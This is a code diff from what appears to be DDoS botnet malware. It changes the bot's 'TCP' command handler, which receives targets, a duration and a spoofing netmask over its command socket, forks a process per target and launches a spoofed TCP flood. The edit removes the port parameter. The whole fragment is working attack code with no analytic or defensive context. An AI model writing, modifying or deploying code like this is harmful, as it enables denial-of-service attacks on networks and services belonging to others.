@@ -1316,18 +1316,17 @@ void processCmd(int argc, unsigned char *argv[])
                 }
             
         }
- if (!strcmp(argv[0], "TCP"))
+if (!strcmp(argv[0], "TCP"))
 {
-    if (argc < 5 || atoi(argv[2]) < 0 || atoi(argv[3]) <= 0 || atoi(argv[4]) < 0 || atoi(argv[4]) > 32)
+    if (argc < 4 || atoi(argv[2]) <= 0 || atoi(argv[3]) < 0 || atoi(argv[3]) > 32)
     {
-        sockprintf(mainCommSock, "Usage: TCP <target> <port> <time> <netmask (0-32)>");
+        sockprintf(mainCommSock, "Usage: TCP <target> <time> <netmask (0-32)>");
         return;
     }
 
     unsigned char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
-    int spoofed = atoi(argv[4]);
+    int time = atoi(argv[2]);
+    int spoofed = atoi(argv[3]);
 
     if (strstr(ip, ",") != NULL)
     {
@@ -1336,7 +1335,7 @@ void processCmd(int argc, unsigned char *argv[])
         {
             if (!listFork())
             {
-                sendTCP(hi, port, time, spoofed);
+                sendTCP(hi, time, spoofed);
                 _exit(0);
             }
             hi = strtok(NULL, ",");
@@ -1345,7 +1344,7 @@ void processCmd(int argc, unsigned char *argv[])
     else
     {
         if (listFork()) return;
-        sendTCP(ip, port, time, spoofed);
+        sendTCP(ip, time, spoofed);
         _exit(0);
     }
 }
